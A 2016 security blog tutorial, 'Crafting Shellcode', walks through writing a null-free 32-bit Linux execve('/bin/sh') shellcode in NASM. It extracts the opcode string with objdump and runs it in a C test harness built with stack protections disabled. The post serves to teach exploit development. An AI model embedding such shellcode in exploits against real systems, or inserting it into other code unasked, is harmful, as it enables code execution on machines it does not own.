@@ -1,0 +1,631 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Bad Hombre's Blog</title>
+  <meta name="theme-color" content="#222222" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://bad-hombres.github.io//blog/js/jquery.min.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/bootstrap.min.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/header.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/toc.js"></script>
+  <link href="https://bad-hombres.github.io//blog/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/theme.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/syntax.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="shortcut icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+
+  
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-99735361-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+
+  
+
+
+ <script type="text/javascript">
+  WebFontConfig = {
+    google: {
+      families: ['Ubuntu::latin']
+    }
+  };
+  (function() {
+    var wf = document.createElement('script');
+    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
+      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+    wf.type = 'text/javascript';
+    wf.async = 'true';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(wf, s);
+  })();
+</script>
+
+  <nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="container">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="https://bad-hombres.github.io//blog/">Bad Hombre's Blog</a>
+      </div>
+      <div class="collapse navbar-collapse">
+        <ul class="nav navbar-nav">
+          <li><a href="https://bad-hombres.github.io//blog/">/home</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/archive.html">/archive</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/tags.html">/tags</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/about.html">/about</a></li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+
+<div class="wrapper">
+  <div class="content">
+    <div class="container container-center">
+      <div class="row">
+        <div class="col-md-8">
+          <div class="article">
+            <div class="well">
+              <h1><a href="https://bad-hombres.github.io//blog/2016/11/02/Crafting-Shellcode.html">Crafting Shellcode</a></h1>
+              <div class="post-meta">
+                <div class="post-time">
+                  <i class="fa fa-calendar"></i>
+                  <time>02 Nov 2016</time>
+                </div>
+                <ul>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/shellcode">shellcode</a></li>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/assembly">assembly</a></li>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
+                  
+                </ul>
+              </div>
+              <div class="post-content">
+                <div id="toc" class="toc"></div>
+                <h3>Written by xirax</h3>
+                <h1 id="intro">Intro</h1>
+<p>Right! Let me start off by saying that this is not going to be and assembly code
+primer. This is just intended to a brief intro into the mindset needed to craft
+shellcode. There are blogs and resources more comprehensive than this post that
+explain things in greater detail, one such book is the <a href="https://www.amazon.co.uk/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X">Shellcoders
+Handbook</a>.</p>
+
+<p>This is just going to be a whrilwind tour, at the end of which you’ll have a
+highlevel view of the thought process that goes into crafting shellcode.</p>
+
+<h1 id="syscalls">Syscalls</h1>
+<p>In linux (IA32) syscalls are generally called by placing the syscall number in
+the EAX register and then putting parameters in EBX, ECX and EDX with the return
+value being placed back in EAX. The kernel is then instructed to execute the
+call bu triggering the 0x80 interupt</p>
+
+<p>How do we find these syscall numbers? Well these are listed in the include file
+unistd_32.h</p>
+
+<p>On the vm I prepared (snag the vagrant file from the Vagrant post) they are in</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | head -20
+  #ifndef _ASM_X86_UNISTD_32_H
+  #define _ASM_X86_UNISTD_32_H
+
+  /*
+   * This file contains the system call numbers.
+   */
+
+  #define __NR_restart_syscall      0
+  #define __NR_exit		  1
+  #define __NR_fork		  2
+  #define __NR_read		  3
+  #define __NR_write		  4
+  #define __NR_open		  5
+  #define __NR_close		  6
+  #define __NR_waitpid		  7
+  #define __NR_creat		  8
+  #define __NR_link		  9
+  #define __NR_unlink		 10
+  #define __NR_execve		 11
+  #define __NR_chdir		 12
+</code></pre>
+</div>
+<p>We are going to write some shellcode which will call the execve syscall which is
+number 11.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+<p>We have our first piece of infomation, 11 is the number for the execve syscall.
+The next piece of info we need is what parameters does execve expect. To find
+this out we turn to the man pages.</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ man execve
+  NAME
+         execve - execute program
+
+  SYNOPSIS
+         #include &lt;unistd.h&gt;
+
+         int execve(const char *filename, char *const argv[],
+                    char *const envp[]);
+</code></pre>
+</div>
+<p>As you can see it takes a string which is the file to execute (which is going to
+be /bin/sh in our example) then it takes an argument array and then an array
+containing the environment (which will be NULL for our purposes).</p>
+
+<p>To recap our arguments are going to be</p>
+<ul>
+  <li>/bin/sh</li>
+  <li>[/bin/sh, 0x0]</li>
+  <li>0x0
+You may be thinking why the arguments array contains a reference to /bin/sh
+again? Well remember from your C days that argv[0] is the program name itself!.</li>
+</ul>
+
+<p>So with that information in mind to think of this call in assembly below is how
+we want the registers to end up right before we call the int 0x80 to trigger the
+call</p>
+<ul>
+  <li>EAX: 11 (execve syscall)</li>
+  <li>EBX: Address of string /bin/sh</li>
+  <li>ECX: Address of Array containing [/bin/sh, 0x0]</li>
+  <li>EDX; Address pinting to a 0z0</li>
+</ul>
+
+<h1 id="limitations">Limitations</h1>
+<p>When generating shellcode we have a few restrictions.</p>
+<ol>
+  <li>We want the shellcode as small as possible, so we tend to reuse data already
+setup</li>
+  <li>We dont want any NULL bytes as they usually cause problems (as 0x0
+terminsates strings etc)</li>
+</ol>
+
+<p>With that in mind lets continue</p>
+
+<h1 id="on-to-the-source">On to the source</h1>
+<p>First I would like to point out I’m using NASM here which uses intel style
+assembly.</p>
+
+<p>First we’ll get the string /bin/sh on the stack. Now it will take less
+instructions to get 8 bytes onto the stack than 7 (the current length of
+/bin/sh) so to get around this we’ll put the string //bin/sh on the stack (try
+this out linux doesnt care about the extra /)</p>
+
+<p>We have to put the string on in reverse order so we start with the null
+terminator</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">  <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>  <span class="c">; zero out eax</span>
+  <span class="k">push</span> <span class="n">eax</span>      <span class="c">; push the 0x0 on the stack</span></code></pre></figure>
+
+<p>we now have the null terminator on the stack so now lets get the rest of the
+string. We’ll use python to get the hex value for this</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ python -c 'print "//bin/sh"[::-1].encode("hex")'
+  68732f6e69622f2f
+</code></pre>
+</div>
+<p>So we split this in half and then push it onto the stack</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">  <span class="k">push</span> <span class="mh">0x68732f6e</span>   <span class="c">; push the first half to the stack</span>
+  <span class="k">push</span> <span class="mh">0x69622f2f</span>   <span class="c">; push the second half of the stack</span>
+  <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>      <span class="c">; move the address of the stack pointer to ebx (1st</span>
+                    <span class="c">; parameter to execve</span></code></pre></figure>
+
+<p>Now we can do two things next</p>
+<ol>
+  <li>Push the 0x0 onto the stack that we can use for the 3rd parameter (address of
+which will go into EDX)</li>
+  <li>We can use the address stored in EBX (the address //bin/sh string) as the
+value of ECX</li>
+</ol>
+
+<p>Point 2 easy to see if you visualize the stack</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>Top                 Bottom of Stack
+0x00000000 //bin/sh 0x00000000
+EDX        EBX
+</code></pre>
+</div>
+<p>So now if we point ECX to the address of the //bin/sh string we have our array</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">  <span class="k">push</span> <span class="n">eax</span>      <span class="c">; push 0x0 on the stack</span>
+  <span class="k">mov</span>  <span class="n">edx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; move the address of 0x0 to the 3rd param</span>
+  <span class="k">push</span> <span class="n">ebx</span>      <span class="c">; push the address of //bin/sh on the stack</span>
+  <span class="k">mov</span>  <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; move the address of the address of //bin/sh into ecx</span>
+                <span class="c">; which is our secong parameter</span></code></pre></figure>
+
+<p>All that is left to do is to make the call</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>  <span class="c">; move 11 into EAX (execve call is number 11)</span>
+  <span class="k">int</span> <span class="mh">0x80</span>    <span class="c">; trigger the call</span></code></pre></figure>
+
+<p>Above you will notice I use the al register which the the 8bit version of the
+EAX register, this is so there are no NULL bytes in the assembly as 32 bit
+version of 11 in hex is 0x0000000b and the 8 bit version is 0x0b.</p>
+
+<p>With that all done here is the final assembly</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="kr">global</span> <span class="n">_start</span>
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+<span class="n">_start</span><span class="o">:</span>
+  <span class="k">xor</span>  <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>	  <span class="c">; zero out eax</span>
+  <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push NULL onto stack to termins //bin/sh</span>
+  <span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">; push //bin/sh in reverse onto the stack</span>
+                  <span class="c">; (extra / is to make data multiple of 4)</span>
+  <span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">; see above</span>
+  <span class="k">mov</span>  <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>   <span class="c">; move address of //bin/sh into EBX (execve's 1st parameter)</span>
+  <span class="k">push</span> <span class="n">eax</span>        <span class="c">; this serves two purposes 1, to use for EDX (we will pass no</span>
+                  <span class="c">; environment to the shell and also as part of the array of</span>
+                  <span class="c">; args that we will pass to as the 2nd arg of execve</span>
+  <span class="k">mov</span>  <span class="n">edx</span><span class="p">,</span> <span class="n">esp</span>	  <span class="c">; see above</span>
+  <span class="k">push</span> <span class="n">ebx</span>        <span class="c">; ESP now points to and array of args [address of //bin/sh, 0x00]</span>
+                  <span class="c">; these will act as the args to //bin/sh</span>
+  <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>	  <span class="c">; setup the 3rd argument</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>      <span class="c">; set the EAX register to the execve sys call number</span>
+                  <span class="c">; using al to remove any null bytes</span>
+  <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; make the call</span></code></pre></figure>
+
+<p>To recap the few tricks we used</p>
+<ol>
+  <li>Used xor to create a NULL without having a null in the code</li>
+  <li>Added the extra / to the /bin/sh string to make pushing the data easier and
+with less instructions</li>
+  <li>Reused data we already had on the stack to create the arguments array for the
+execve call</li>
+  <li>Used the 8 bit version (al) of the EAX register to avoid NULL bytes in the
+generated code</li>
+</ol>
+
+<p>Save the above code to execve.nasm, compile, link and run</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ nasm -f elf32 -o execve.o execve.nasm
+  $ ld -o execve execve.o
+  $ ./execve
+  $
+</code></pre>
+</div>
+<p>If you are running bash you will notice now that your prompt has changed,
+congrats your syscall worked!!</p>
+
+<h1 id="converting-to-shellcode">Converting to shellcode</h1>
+<p>So how do we go about converting this assembled object file into a shellcode
+string you see in exploits? There is a little tool called objdump which happens
+to have a -d flag and this flag dissasembles object files, lets see</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ objdump -d execve.o
+
+  execve.o:     file format elf32-i386
+
+
+  Disassembly of section .text:
+
+  00000000 &lt;_start&gt;:
+     0:	31 c0                	xor    %eax,%eax
+     2:	50                   	push   %eax
+     3:	68 6e 2f 73 68       	push   $0x68732f6e
+     8:	68 2f 2f 62 69       	push   $0x69622f2f
+     d:	89 e3                	mov    %esp,%ebx
+     f:	50                   	push   %eax
+    10:	89 e2                	mov    %esp,%edx
+    12:	53                   	push   %ebx
+    13:	89 e1                	mov    %esp,%ecx
+    15:	b0 0b                	mov    $0xb,%al
+    17:	cd 80                	int    $0x80
+</code></pre>
+</div>
+<p>As you can see we from above we have our original assembly back (kind of). You
+see those hex bytes that appear before our assembly instructions? Those are the
+op codes that the CPU understands and those are what we need in our shellcode
+string.</p>
+
+<p>First we will need only the lines that contain instructions</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ objdump -d execve.o | grep "^ "
+     0:	31 c0                	xor    %eax,%eax
+     2:	50                   	push   %eax
+     3:	68 6e 2f 73 68       	push   $0x68732f6e
+     8:	68 2f 2f 62 69       	push   $0x69622f2f
+     d:	89 e3                	mov    %esp,%ebx
+     f:	50                   	push   %eax
+    10:	89 e2                	mov    %esp,%edx
+    12:	53                   	push   %ebx
+    13:	89 e1                	mov    %esp,%ecx
+    15:	b0 0b                	mov    $0xb,%al
+    17:	cd 80                	int    $0x80
+</code></pre>
+</div>
+<p>Next we want just the second column or field</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ objdump -d execve.o | grep "^ " | cut -f2
+  31 c0
+  50
+  68 6e 2f 73 68
+  68 2f 2f 62 69
+  89 e3
+  50
+  89 e2
+  53
+  89 e1
+  b0 0b
+  cd 80
+</code></pre>
+</div>
+<p>Then we want to iterate over each of these bytes and put the \x in front of
+them. For loops to the rescue</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ for i in $(objdump -d execve.o | grep "^ " | cut -f2); do echo '\x'$i; done
+  \x31
+  \xc0
+  \x50
+  \x68
+  \x6e
+  \x2f
+  \x73
+  \x68
+  \x68
+  \x2f
+  \x2f
+  \x62
+  \x69
+  \x89
+  \xe3
+  \x50
+  \x89
+  \xe2
+  \x53
+  \x89
+  \xe1
+  \xb0
+  \x0b
+  \xcd
+  \x80
+</code></pre>
+</div>
+<p>Nearly! Fortunately echo has a -n flag that prevents it from printing newlines</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ for i in $(objdump -d execve.o | grep "^ " | cut -f2); do echo -n '\x'$i; done
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80$
+</code></pre>
+</div>
+<p>So close!!!! We can just put an extra echo at the end</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ for i in $(objdump -d execve.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+  \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+  $
+</code></pre>
+</div>
+<h1 id="test-the-shellcode">Test the shellcode</h1>
+<p>Now to test the shellcode we need a program we can put this in to run it. Below
+is a C program whic I did not create myself (Thanks Vivek from
+<a href="http://www.securitytube.net">SecurityTube</a></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f</span><span class="s">"</span> \
+<span class="s">"</span><span class="se">\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89</span><span class="s">"</span> \
+<span class="s">"</span><span class="se">\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+<span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
+
+        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
+
+        <span class="n">ret</span><span class="p">();</span>
+
+<span class="p">}</span></code></pre></figure>
+
+<p>This program just passes execution to our shellcode which we placed in the code
+string. Compile it using</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>  $ gcc -fno-stack-protector -z execstack -o shell_test shell_test.c
+  $ ./shell_test 
+  Shellcode Length:  25
+  $  
+</code></pre>
+</div>
+<p>as you can see the program printed the length of the shellcode and then passed
+control of execution to our shellcode and we have now ended up with a shell!</p>
+
+<p>Hope you enjoyed this. Check out <a href="http://www.securitytube.net">SecurityTube</a>
+they have free videos on x86 linux and windows assembly if you are interested in
+that sort of thing!</p>
+
+                
+
+<div class="share-bar">
+  <ul class="share-buttons">
+    
+    <li class="share-facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://bad-hombres.github.io//2016/11/02/Crafting-Shellcode.html" target="_blank" title="Share on Facebook">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-facebook fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-twitter">
+      <a href="https://twitter.com/intent/tweet?url=https://bad-hombres.github.io//2016/11/02/Crafting-Shellcode.html&text=Crafting Shellcode" target="_blank" title="Tweet">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-twitter fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-google-plus">
+      <a href="https://plus.google.com/share?url=https://bad-hombres.github.io//2016/11/02/Crafting-Shellcode.html" target="_blank" title="Share on Google Plus">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-google-plus fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-linkedin">
+      <a href="http://www.linkedin.com/shareArticle?mini=true&url=https://bad-hombres.github.io//2016/11/02/Crafting-Shellcode.html&title=Crafting Shellcode&summary=Introduction to writing shell code&source=" target="_blank" title="Share on LinkedIn">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-linkedin fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-pinterest">
+      <a href="http://pinterest.com/pin/create/button/?urlhttps://bad-hombres.github.io//2016/11/02/Crafting-Shellcode.html=&description=Introduction to writing shell code" target="_blank" title="Pin it">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-pinterest fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-envelope">
+      <a href="mailto:?&subject=Crafting Shellcode&body=Introduction to writing shell code https://bad-hombres.github.io//2016/11/02/Crafting-Shellcode.html" target="_blank" title="Email">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-envelope-o fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+  </ul>
+</div>
+
+
+              </div>
+              
+              <div id="disqus_thread">
+                <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+              </div>
+              
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4 hidden-xs">
+          <div class="sidebar ">
+  <h2>Recent Posts</h2>
+  <ul>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2018/11/01/Buffer-Overflow-Level-2.html">Buffer Overflows: Level 2 (ret2libc)</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2017/03/21/SLAE-TCP-Bind-Shell.html">SLAE: TCP Bind Shell</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/03/Buffer-Overflow-Level-1.html">Buffer Overflows: Level 1 (ret2stack)</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/02/Crafting-Shellcode.html">Crafting Shellcode</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/01/Format-Strings.html">Format Strings</a></li>
+    
+  </ul>
+</div>
+
+<div class="sidebar">
+  <h2>Tags</h2>
+  <ul>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/tools">tools</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/exploit">exploit</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/shellcode">shellcode</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/assembly">assembly</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/bufferoverflow">bufferoverflow</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/slae">slae</a></li>
+    
+  </ul>
+</div>
+
+        </div>
+      </div>
+    </div>
+    
+<!-- Add Disqus comments. -->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+  var disqus_shortname = 'bad-hombres'; // required: replace example with your forum shortname
+  var disqus_identifier = "/2016/11/02/Crafting-Shellcode.html";
+
+  /* * * DON'T EDIT BELOW THIS LINE * * */
+  (function() {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+  </div>
+      <footer class="footer-distributed">
+      <div class="container">
+        <div class="footer">
+          <p>Bad Hombres &copy; 2017</p>
+          <h6>Follow us</h6>
+
+<ul class="social-media">
+
+  
+    <li>
+      <a title="bad-hombres on Github" href="https://github.com/bad-hombres" target="_blank"><i class="fa fa-github fa-2x"></i></a>
+    </li>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    <li>
+      <a title="feed.xml RSS" href="/blog/feed.xml" target="_blank"><i class="fa fa-rss fa-2x"></i></a>
+    </li>
+  
+
+</ul>
+
+
+          <p> Original theme from <a href="https://github.com/streetturtle/jekyll-clean-dark">Here</a>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
+
+</div>
